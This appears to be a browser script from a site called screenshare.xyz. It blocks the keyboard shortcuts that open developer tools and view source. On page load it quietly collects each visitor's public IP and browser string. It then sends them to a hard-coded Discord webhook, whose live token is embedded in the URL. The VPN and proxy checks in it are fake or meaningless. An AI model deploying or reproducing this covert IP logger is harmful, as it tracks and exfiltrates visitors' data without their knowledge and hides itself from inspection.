document.onkeydown = function (e) {
  if (event.keyCode == 123) {
      return false;
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
      return false;
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "C".charCodeAt(0)) {
      return false;
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
      return false;
  }

  if (e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
      return false;
  }
}
fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ip = data.ip;
    computerName = navigator.userAgent;
    browser = navigator.userAgent.toLowerCase();
    isVPNActive = false;

    // Sprawdzenie czy użytkownik korzysta z proxy (przykładowa implementacja)
    isUsingProxy = false;
    if ('connection' in navigator) {
      if (navigator.connection.effectiveType === '2g') {
        isUsingProxy = true;
      }
    }

    var webhook = 'https://discord.com/api/webhooks/1146739158845493368/yQ3PKVJjbdx4YsDMKYOdFSGHTs17T1xDho4KXp4PkFEfjd6KacqO5U8czjECBESP7kqk';

    var message = {
      embeds: [
        {
          title: '',
          color: 3447003,
          inline: true,
          fields: [
            {
              name: 'Someone Connected to screenshare.xyz:',
              value: ip,
              inline: true
            },
            {
              name: 'Browser:',
              value: browser,
              inline: true
            },
            {
              name: 'VPN Active:',
              value: isVPNActive ? 'Yes' : 'No',
              inline: true
            },
            {
              name: 'Using Proxy:',
              value: isUsingProxy ? 'Yes' : 'No',
              inline: true
            }
          ]
        }
      ]
    };

    fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
  });